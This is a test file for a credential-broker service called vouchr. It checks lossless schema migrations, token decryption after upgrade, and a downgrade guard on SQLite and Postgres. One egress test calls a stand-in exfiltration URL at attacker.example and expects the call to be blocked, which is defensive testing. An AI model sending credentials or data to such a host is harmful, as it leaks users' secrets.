import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import BetterSqlite3 from 'better-sqlite3';
import { Pool } from 'pg';
import { openDb, SCHEMA_VERSION, type Db } from '../src/core/db';
import { toBuffer } from '../src/core/crypto';
import { Vault } from '../src/core/vault';
import { Audit } from '../src/core/audit';
import { Consent } from '../src/core/consent';
import { userOwner, channelOwner } from '../src/core/owner';
import { github } from '../src/core/providers';
import { ConnectionHandle, EgressBlockedError } from '../src/core/injector';
import { FIXTURE_KEY, SEED, schemaSqlV020, seedSqlV020 } from './fixtures/schema-v0.2.0';

// Schema UPGRADE tests (#130): build a database exactly as a PREVIOUS release shipped it (frozen
// fixture, see test/fixtures/schema-v0.2.0.ts), open it with the CURRENT openDb() — which runs the
// migrations — and prove the upgrade is lossless: every seeded row survives, encrypted tokens still
// decrypt to the seeded plaintexts, a connect()-level flow and a handle.fetch egress check work
// against the migrated store, and re-opening is a no-op. Plus the downgrade guard: a database
// stamped by a NEWER vouchr is refused with an actionable error, never "migrated" destructively.

const count = async (db: Db, table: string) =>
  Number(((await db.get<{ n: unknown }>(`SELECT COUNT(*) AS n FROM ${table}`)) as any).n);

/** Every seeded v0.2.0 row survived the migration, value-for-value, and still decrypts. */
async function assertSeedIntact(db: Db): Promise<void> {
  // Nothing lost, nothing duplicated.
  assert.equal(await count(db, 'connection'), 3);
  assert.equal(await count(db, 'consent_request'), 1);
  assert.equal(await count(db, 'session_grant'), 1);
  assert.equal(await count(db, 'audit'), 2);
  // The migration actually ran: v0.2.0 had no channel_preview table; current schema does.
  assert.equal(await count(db, 'channel_preview'), 0);
  assert.equal(await count(db, 'notification_state'), 0); // #117 table exists post-migration, empty
  // The bootstrap assumption: a marker-less DB with existing tables is a pre-marker (≤ v0.2.x)
  // deploy; after the idempotent migrations it IS at the current version, and gets stamped so.
  const marker = (await db.get<{ value: string }>(`SELECT value FROM meta WHERE key='schema_version'`)) as any;
  assert.equal(Number(marker?.value), SCHEMA_VERSION);

  // Connection rows: every non-encrypted column byte-for-byte.
  const conns = [
    ...SEED.users.map((u) => ({ ...u, ownerKind: 'user', ownerId: u.userId })),
    { ...SEED.channel, ownerKind: 'channel', ownerId: SEED.channel.channelId },
  ];
  for (const c of conns) {
    const row = (await db.get(`SELECT * FROM connection WHERE id=?`, [c.connectionId])) as any;
    assert.ok(row, `connection row ${c.connectionId} survived`);
    assert.equal(row.enterprise_id, null);
    assert.equal(row.team_id, SEED.teamId);
    assert.equal(row.owner_kind, c.ownerKind);
    assert.equal(row.owner_id, c.ownerId);
    assert.equal(row.provider, c.provider);
    assert.equal(row.source, 'vault');
    assert.equal(row.secret_ref, null);
    assert.equal(row.scopes, c.scopes);
    assert.equal(row.expires_at, null);
    assert.equal(row.external_account, c.externalAccount);
    assert.equal(Number(row.created_at), c.createdAt);
    assert.equal(Number(row.updated_at), c.updatedAt);
    if (c.lastUsedAt === null) assert.equal(row.last_used_at, null);
    else assert.equal(Number(row.last_used_at), c.lastUsedAt);
    // SEC-1: ciphertext at rest never contains the plaintext.
    assert.ok(!toBuffer(row.access_token_enc).toString('utf8').includes(c.accessToken));
  }

  // Encrypted tokens still DECRYPT to the seeded plaintexts — the losslessness that matters.
  const vault = new Vault(db, FIXTURE_KEY);
  for (const u of SEED.users) {
    const cred = await vault.get(userOwner({ enterpriseId: null, teamId: SEED.teamId, userId: u.userId }), u.provider);
    assert.equal(cred?.accessToken, u.accessToken);
    assert.equal(cred?.refreshToken, u.refreshToken);
  }
  const shared = await vault.get(channelOwner(SEED.teamId, SEED.channel.channelId), SEED.channel.provider);
  assert.equal(shared?.accessToken, SEED.channel.accessToken);

  // Consent row, column-for-column.
  const consent = (await db.get(`SELECT * FROM consent_request WHERE state=?`, [SEED.consent.state])) as any;
  assert.ok(consent, 'consent row survived');
  assert.equal(consent.enterprise_id, null);
  assert.equal(consent.team_id, SEED.teamId);
  assert.equal(consent.user_id, SEED.consent.userId);
  assert.equal(consent.provider, SEED.consent.provider);
  assert.equal(consent.channel, SEED.consent.channel);
  assert.equal(consent.pkce_verifier, SEED.consent.pkceVerifier);
  assert.equal(Number(consent.created_at), SEED.consent.createdAt);

  // Session grant, column-for-column.
  const g = (await db.get(`SELECT * FROM session_grant WHERE team_id=? AND user_id=? AND provider=?`, [
    SEED.teamId, SEED.sessionGrant.userId, SEED.sessionGrant.provider,
  ])) as any;
  assert.ok(g, 'session grant survived');
  assert.equal(g.channel, SEED.sessionGrant.channel);
  assert.equal(g.thread, SEED.sessionGrant.thread);
  assert.equal(Number(g.created_at), SEED.sessionGrant.createdAt);
  assert.equal(Number(g.expires_at), SEED.sessionGrant.expiresAt);

  // Audit rows, column-for-column (meta is an API — STR-4 — so it must survive verbatim).
  for (const a of SEED.audit) {
    const row = (await db.get(`SELECT * FROM audit WHERE id=?`, [a.id])) as any;
    assert.ok(row, `audit row ${a.id} survived`);
    assert.equal(row.team_id, SEED.teamId);
    assert.equal(row.user_id, a.userId);
    assert.equal(row.provider, a.provider);
    assert.equal(row.action, a.action);
    assert.equal(row.actor, a.actor);
    assert.equal(row.channel, a.channel);
    assert.equal(row.meta, a.meta);
    assert.equal(Number(row.at), a.at);
  }
}

/** connect()-level flow + handle.fetch egress checks work against the MIGRATED store. Mutates the
 *  DB (new consent/connection/audit rows), so run it only after the losslessness asserts. */
async function assertConnectAndEgress(db: Db): Promise<void> {
  const vault = new Vault(db, FIXTURE_KEY);
  const audit = new Audit(db);
  const provider = github({ clientId: 'test-client', clientSecret: 'test-secret' });

  // Consent (the connect() flow's core): begin → single-use consume → vault write → readback.
  const consent = new Consent(db);
  const carol = { enterpriseId: null, teamId: SEED.teamId, userId: 'U_CAROL' };
  const { state } = await consent.begin(carol, provider, 'https://broker.example/cb', SEED.channel.channelId);
  assert.equal((await consent.consume(state))?.identity.userId, 'U_CAROL');
  assert.equal(await consent.consume(state), null); // still single-use after migration
  await vault.upsert(userOwner(carol), 'github', {
    accessToken: 'test-token-carol-github', refreshToken: null, scopes: 'repo', expiresAt: null, externalAccount: null,
  });
  assert.equal((await vault.get(userOwner(carol), 'github'))?.accessToken, 'test-token-carol-github');

  // handle.fetch on the MIGRATED alice row: ciphertext → decrypt → Bearer injection on an
  // allowlisted host; egress fails closed off the allowlist. Fetch stubbed (TEST-3).
  const alice = { enterpriseId: null, teamId: SEED.teamId, userId: SEED.users[0].userId };
  const handle = new ConnectionHandle(provider, userOwner(alice), alice, vault, audit);
  const realFetch = globalThis.fetch;
  try {
    let sawAuth: string | null = null;
    globalThis.fetch = (async (_url: any, init: any) => {
      sawAuth = new Headers(init?.headers).get('authorization');
      return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
    }) as any;
    const res = await handle.fetch('https://api.github.com/user');
    assert.equal(res.status, 200);
    assert.equal(sawAuth, `Bearer ${SEED.users[0].accessToken}`); // the v0.2.0-seeded token, decrypted post-migration
    await assert.rejects(handle.fetch('https://attacker.example/exfil'), EgressBlockedError);
  } finally {
    globalThis.fetch = realFetch;
  }
}

function assertDowngradeError(e: unknown): boolean {
  const msg = (e as Error).message;
  assert.ok(msg.includes(String(SCHEMA_VERSION + 1)), 'names the database schema version');
  assert.ok(msg.includes(`supports up to schema version ${SCHEMA_VERSION}`), 'names the supported version');
  assert.ok(/upgrade/i.test(msg) && /backup/i.test(msg), 'states the remedy');
  return true;
}

// ---------------------------------------------------------------------------------------- sqlite

test('sqlite: seeded v0.2.0 database upgrades losslessly and idempotently; connect/egress work after', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'vouchr-migration-'));
  const file = join(dir, 'v020.db');
  try {
    // Build + seed the OLD database exactly as v0.2.0 shipped it (WAL, like v0.2.0's openDb set).
    const raw = new BetterSqlite3(file);
    raw.pragma('journal_mode = WAL');
    raw.exec(schemaSqlV020('sqlite'));
    raw.exec(seedSqlV020('sqlite'));
    raw.close();

    // First open with the CURRENT openDb() runs the migrations.
    const db1 = await openDb({ dbPath: file });
    try {
      await assertSeedIntact(db1);
    } finally {
      await db1.close();
    }

    // Second open must be a no-op (idempotent migrations): same rows, still decryptable.
    const db2 = await openDb({ dbPath: file });
    try {
      await assertSeedIntact(db2);
      await assertConnectAndEgress(db2);
    } finally {
      await db2.close();
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('sqlite: fresh DB gets the schema_version marker; a newer-schema DB is refused, unmodified', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'vouchr-migration-'));
  const file = join(dir, 'fresh.db');
  try {
    // Empty database (no tables, no marker) → bootstrap stamps the CURRENT version.
    const db = await openDb({ dbPath: file });
    try {
      const row = (await db.get<{ value: string }>(`SELECT value FROM meta WHERE key='schema_version'`)) as any;
      assert.equal(Number(row?.value), SCHEMA_VERSION);
    } finally {
      await db.close();
    }

    // Simulate a database written by a FUTURE vouchr.
    const raw = new BetterSqlite3(file);
    raw.prepare(`UPDATE meta SET value=? WHERE key='schema_version'`).run(String(SCHEMA_VERSION + 1));
    raw.close();

    await assert.rejects(openDb({ dbPath: file }), assertDowngradeError);

    // Fail-closed means fail-UNTOUCHED: the refusal must not have re-stamped the marker.
    const check = new BetterSqlite3(file);
    const after = check.prepare(`SELECT value FROM meta WHERE key='schema_version'`).get() as any;
    check.close();
    assert.equal(after.value, String(SCHEMA_VERSION + 1));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// #117 upgrade path: a database stamped exactly schema version 2 (this build's schema minus the
// notification_state table) must open cleanly, get the additive table, and be re-stamped to the
// current version — the exact state every pre-#117 deployment is in on its first post-upgrade boot.
test('sqlite: a schema-version-2 database (pre-notification_state) upgrades in place: marker -> 3, notification_state usable', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'vouchr-migration-'));
  const file = join(dir, 'v2.db');
  try {
    // Fabricate the v2 state: current schema, then drop the #117 table and stamp the marker at 2
    // (v2 == v3 minus notification_state by construction — see SCHEMA_VERSION's doc).
    const db0 = await openDb({ dbPath: file });
    await db0.close();
    const raw = new BetterSqlite3(file);
    raw.exec(`DROP TABLE notification_state`);
    raw.prepare(`UPDATE meta SET value='2' WHERE key='schema_version'`).run();
    raw.close();

    const db = await openDb({ dbPath: file }); // 2 <= SCHEMA_VERSION -> proceeds, never refuses
    try {
      const marker = (await db.get<{ value: string }>(`SELECT value FROM meta WHERE key='schema_version'`)) as any;
      assert.equal(Number(marker?.value), SCHEMA_VERSION); // re-stamped to the current version
      // The additive migration created the table and it is immediately usable.
      await db.run(
        `INSERT INTO notification_state (team_id, owner_kind, owner_id, provider, type, last_notified_at) VALUES ('T1','user','U1','github','refresh_dead',1)`,
      );
      const n = (await db.get<{ n: number }>(`SELECT COUNT(*) AS n FROM notification_state`)) as any;
      assert.equal(Number(n?.n), 1);
    } finally {
      await db.close();
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// #116 v3 -> v4: a pre-dry-run database (connection table without the `dry_run` column) must open
// cleanly, get the additive column defaulting to 0 (existing rows classify as REAL), and re-stamp.
test('sqlite: a schema-version-3 database (pre-dry_run) upgrades in place: connection.dry_run added, existing rows default 0', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'vouchr-migration-'));
  const file = join(dir, 'v3.db');
  try {
    // Fabricate the v3 state: current schema, drop the #116 column, seed a row, stamp the marker at 3.
    const db0 = await openDb({ dbPath: file });
    await db0.run(
      `INSERT INTO connection (id, team_id, owner_kind, owner_id, provider, source, scopes, created_at, updated_at)
       VALUES ('c1','T1','user','U1','github','vault','',1,1)`,
    );
    await db0.close();
    const raw = new BetterSqlite3(file);
    raw.exec(`ALTER TABLE connection DROP COLUMN dry_run`); // back to the pre-#116 shape
    raw.prepare(`UPDATE meta SET value='3' WHERE key='schema_version'`).run();
    raw.close();

    const db = await openDb({ dbPath: file }); // 3 <= SCHEMA_VERSION -> proceeds, never refuses
    try {
      const marker = (await db.get<{ value: string }>(`SELECT value FROM meta WHERE key='schema_version'`)) as any;
      assert.equal(Number(marker?.value), SCHEMA_VERSION); // re-stamped to the current version
      // The additive column exists and the PRE-EXISTING row defaults to 0 (a real credential).
      const row = (await db.get<{ dry_run: number }>(`SELECT dry_run FROM connection WHERE id='c1'`)) as any;
      assert.equal(Number(row?.dry_run), 0);
    } finally {
      await db.close();
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// -------------------------------------------------------------------------------------- postgres

// Same invariants against a REAL Postgres, in a dedicated pg schema (search_path) so this leg
// never touches the tables other test files use. Skips when no PG is reachable (npm run pg:up).
const PG_URL = process.env.VOUCHR_TEST_PG_URL ?? 'postgres://vouchr:vouchr@localhost:5433/vouchr';
const PG_SCHEMA = 'vouchr_migration_upgrade_test';

function pgScopedUrl(): string {
  const u = new URL(PG_URL);
  u.searchParams.set('options', `-csearch_path=${PG_SCHEMA}`);
  return u.toString();
}

test('postgres: seeded v0.2.0 database upgrades losslessly and idempotently; downgrade guard fails closed', async (t) => {
  let admin: Pool | undefined;
  try {
    admin = new Pool({ connectionString: PG_URL, connectionTimeoutMillis: 2_000 });
    await admin.query('SELECT 1');
  } catch {
    await admin?.end().catch(() => undefined);
    t.skip('Postgres not reachable. Run `npm run pg:up` to exercise the PG backend');
    return;
  }
  try {
    await admin.query(`DROP SCHEMA IF EXISTS ${PG_SCHEMA} CASCADE`);
    await admin.query(`CREATE SCHEMA ${PG_SCHEMA}`);

    // Build + seed the OLD database through the SAME type-name parameterization v0.2.0 used on PG.
    const old = new Pool({ connectionString: pgScopedUrl() });
    try {
      await old.query(schemaSqlV020('pg'));
      await old.query(seedSqlV020('pg'));
    } finally {
      await old.end();
    }

    const db1 = await openDb({ databaseUrl: pgScopedUrl() });
    try {
      await assertSeedIntact(db1);
    } finally {
      await db1.close();
    }

    const db2 = await openDb({ databaseUrl: pgScopedUrl() });
    try {
      await assertSeedIntact(db2);
      await assertConnectAndEgress(db2);
    } finally {
      await db2.close();
    }

    // Downgrade guard: stamp a FUTURE version, openDb must refuse and leave the marker alone.
    await admin.query(`UPDATE ${PG_SCHEMA}.meta SET value='${SCHEMA_VERSION + 1}' WHERE key='schema_version'`);
    await assert.rejects(openDb({ databaseUrl: pgScopedUrl() }), assertDowngradeError);
    const after = await admin.query(`SELECT value FROM ${PG_SCHEMA}.meta WHERE key='schema_version'`);
    assert.equal(after.rows[0].value, String(SCHEMA_VERSION + 1));

    // Fresh-schema bootstrap: an EMPTY database gets stamped with the current version.
    await admin.query(`DROP SCHEMA ${PG_SCHEMA} CASCADE`);
    await admin.query(`CREATE SCHEMA ${PG_SCHEMA}`);
    const fresh = await openDb({ databaseUrl: pgScopedUrl() });
    try {
      const row = (await fresh.get<{ value: string }>(`SELECT value FROM meta WHERE key='schema_version'`)) as any;
      assert.equal(Number(row?.value), SCHEMA_VERSION);
    } finally {
      await fresh.close();
    }
  } finally {
    await admin.query(`DROP SCHEMA IF EXISTS ${PG_SCHEMA} CASCADE`).catch(() => undefined);
    await admin.end();
  }
});
